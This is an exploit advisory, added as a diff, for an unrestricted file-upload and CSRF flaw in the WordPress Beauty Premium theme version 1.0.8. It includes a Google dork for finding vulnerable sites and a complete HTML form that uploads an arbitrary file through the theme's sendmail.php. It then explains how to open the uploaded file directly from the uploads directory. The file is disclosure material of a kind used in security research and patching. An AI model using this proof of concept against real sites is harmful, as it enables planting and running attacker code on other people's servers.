@@ -1,0 +1,36 @@
+* Exploit Title: Wordpress Beauty Theme File Upload Vulnerability v1.0.8
+* Discovery Date: 02.09.2016
+* Public Disclosure Date:03.09.2016
+* Vendor Homepage: http://www.yourinspirationweb.com
+* Exploit Author: Colette Chamberland (Wordfence)
+* Contact: colette@wordfence.com
+* Version: 1.0.8 (may affect newer versions but this was all I had)
+* Tested on: Wordpress 4.2.x-4.4.x
+ 
+Description
+================================================================================
+ The Beauty Premium theme contains a contact form that is vulnerable to CSRF
+ and File Upload vulnerability in the sendmail.php file. The file attachment
+ gets uploaded to the wordpress upload directory and it is not sanitized,
+ allowing attackers to upload harmful code. 
+ 
+ 
+PoC
+================================================================================
+Google Dork inurl:themes/beauty-premium/ or detect via WPScan:
+
+<form method="post" action="http://[target]/wp-content/themes/beauty-premium/includes/sendmail.php" enctype="multipart/form-data">
+<input type="text" name="yiw_contact[name]" id="name-test" class="required" value="test" />
+<input type="text" name="yiw_contact[email]" id="email-test" class="required email-validate" value="test@nowhere.com" />
+<input type="text" name="yiw_contact[phone]" id="phone-test" class="" value="1234567890" />
+<input type="text" name="yiw_contact[website]" id="website-test" class="" value="http://www.blah.com" />
+<textarea name="yiw_contact[message]" id="message-test" rows="8" cols="30" class="required">This is a FUV test&lt;/textarea&gt;
+<input type="file" name="yiw_contact[file]" allow="text/*" maxlength="50">
+<li class="submit-button">
+<input type="hidden" name="yiw_action" value="sendemail" id="yiw_action" />
+<input type="hidden" name="yiw_referer" value="http://[target]/wp-content/themes/beauty-premium/includes/sendmail.php" />
+<input type="hidden" name="id_form" value="test" />
+<input type="submit" name="yiw_sendemail" value="send message" class="sendmail alignright" />			</li>
+</form>
+
+You will receive a 404 error after posting, but navigate to the sites upload directory and access your uploaded file directly.
